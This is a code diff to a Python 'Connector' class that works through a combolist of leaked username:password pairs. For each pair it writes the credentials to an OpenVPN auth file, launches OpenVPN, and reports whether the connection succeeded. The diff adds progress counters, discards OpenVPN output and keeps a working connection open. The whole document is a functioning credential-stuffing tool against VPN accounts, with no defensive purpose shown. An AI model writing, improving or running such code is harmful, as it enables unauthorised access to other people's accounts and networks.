@@ -1,15 +1,14 @@
 import logging
 import subprocess
-import threading
 import time
 
 DEBUG = False
 INFO = True
 log = logging.getLogger('Connector-Logger')  # Creating logger
-if DEBUG:
-    log.setLevel(logging.DEBUG)  # Setting logging level to DEBUG
 if INFO:
     log.setLevel(logging.INFO)  # Setting logging level to INFO (default)
+if DEBUG:
+    log.setLevel(logging.DEBUG)  # Setting logging level to DEBUG
 log.addHandler(logging.StreamHandler())  # Adding StreamHandler
 
 
@@ -30,25 +29,21 @@ class Connector:
             self.combolist = combos.readlines()
 
     def connect(self):
-        for combo in self.combolist:
-            log.info(f'Trying {combo.strip()}...')
+        length = len(self.combolist)
+        for i, combo in enumerate(self.combolist):
+            log.info(f'Trying #{i+1}/{length}: {combo.strip()}...')
             with open('ovpn/auth.txt', 'w') as auth:
                 auth.write(combo.strip().replace(':', '\n', 1))
             ovpn = subprocess.Popen([self.ovpn_path, '--config', self.config_path, '--auth-user-pass', 'ovpn/auth.txt'],
-                                    stdout=subprocess.PIPE)
-
-            def read_output():
-                while ovpn.poll() is None:
-                    log.debug(ovpn.stdout.readline())
-                return
-            thread = threading.Thread(target=read_output)
-            thread.start()
+                                    stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                    close_fds=True)
 
             time.sleep(self.timeout)
             if ovpn.poll() is None:
-                log.info('Connected successfully, OpenVPN output: \n\n' + ovpn.stdout.read(1024).decode())
-
-            log.info(f'Combo {combo.strip()} didn\'t work.')
+                log.info(f"\n\n{'-'*25}\nConnected successfully\n{'-'*25}\n\n")
+                ovpn.wait()
+            else:
+                log.info(f'Combo {combo.strip()} didn\'t work.')
         log.info('No working combo found.')
 
 
